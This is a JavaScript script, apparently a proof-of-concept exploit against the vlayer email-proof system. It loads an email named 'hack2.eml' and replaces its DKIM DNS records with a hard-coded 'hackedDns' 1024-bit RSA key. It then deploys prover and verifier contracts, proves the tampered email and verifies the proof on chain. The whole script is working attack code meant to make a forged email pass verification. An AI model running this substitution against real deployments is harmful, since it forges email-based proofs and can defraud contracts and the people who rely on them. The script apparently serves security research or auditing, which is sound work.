import fs from "fs";
import { createVlayerClient, preverifyEmail } from "@vlayer/sdk";
import {
  getConfig,
  createContext,
  deployVlayerContracts,
} from "@vlayer/sdk/config";

import proverSpec from "../out/EmailProver.sol/EmailProver";
import verifierSpec from "../out/EmailProofVerifier.sol/EmailProofVerifier";

const mimeEmail = fs.readFileSync("./testdata/hack2.eml").toString();

const unverifiedEmail = await preverifyEmail(mimeEmail);
const hackedDns = 'v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCPwsG12awgnJc3oDr984Y5bVhgJ+EPiGlPqGD+IwD/iVz80hI9o3AVfEjmUgHxCToZsuRxs6dez3TDD1wYRiWcNlmgcEy68IxuAf4nAGxmAueSKRYoencKlH5Bn5XDnQDlnZbr7WWsKlBoDfb2lhK+WSxmDm4oo7Zh+qxzh45elwIDAQAB; n=1024,1450901090,1466712290'
unverifiedEmail.dnsRecords = [hackedDns]
console.log(unverifiedEmail);

const config = getConfig();

const { chain, ethClient, account, proverUrl, confirmations } =
  await createContext(config);

console.log("Proving...");

const { prover, verifier } = await deployVlayerContracts({
  proverSpec,
  verifierSpec,
});

const vlayer = createVlayerClient({
  url: proverUrl,
});

const hash = await vlayer.prove({
  address: prover,
  proverAbi: proverSpec.abi,
  functionName: "main",
  chainId: chain.id,
  args: [unverifiedEmail],
});

const result = await vlayer.waitForProvingResult(hash);
console.log("Proof:", result[0]);
console.log("Verifying...");



const txHash = await ethClient.writeContract({
  address: verifier,
  abi: verifierSpec.abi,
  functionName: "verify",
  args: result,
  chain,
  account: account,
});

await ethClient.waitForTransactionReceipt({
  hash: txHash,
  confirmations,
  retryCount: 60,
  retryDelay: 1000,
});

console.log("Verified!");
